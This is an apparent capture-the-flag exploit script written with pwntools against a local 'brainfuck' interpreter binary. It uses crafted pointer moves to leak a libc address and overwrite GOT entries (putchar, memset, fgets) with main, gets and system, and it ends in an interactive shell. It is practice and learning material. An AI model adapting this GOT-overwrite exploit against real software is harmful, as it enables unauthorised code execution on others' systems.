import pwn
from bfptr import bfptr


pwn.context.log_level = 'debug'
pwn.context.terminal = 'st'

elf = pwn.context.binary = pwn.ELF('./brainfuck', checksec=False)
libc = pwn.ELF('/usr/lib32/libc.so.6', checksec=False)


ptr = bfptr()

ptr.move_to(elf.got['fgets'])
#ptr.write_32(pwn.p32(1))
ptr.read_32()

ptr.move_to(elf.got['putchar'])
ptr.write_32(elf.sym['main'])
ptr.intructions += '.'

print(len(ptr.to_payload()))


program = pwn.process('./brainfuck')
program.send(ptr.to_payload())

program.recvuntil('type some brainfuck instructions except [ ]\n')
fgets_address = pwn.unpack(program.recv(4)[:4]) 
libc_base = fgets_address - libc.sym['fgets']


del ptr

system_address = libc.sym['system'] + libc_base
gets_address = libc.sym['gets'] + libc_base

pwn.info(f"fgets_adress: {hex(fgets_address)}")
pwn.info(f"puts adress: {hex(libc_base + libc.sym['puts'])}")

ptr2 = bfptr()

ptr2.move_to(elf.got['memset'])
ptr2.write_32(gets_address)
ptr2.move_to(elf.got['fgets'])
ptr2.write_32(system_address)
ptr2.intructions += '.'


program.send(ptr2.to_payload())
program.interactive()


print(hex(fgets_address))

# f = open('pl', 'wb')
# f.write(ptr.to_payload())
# f.close()


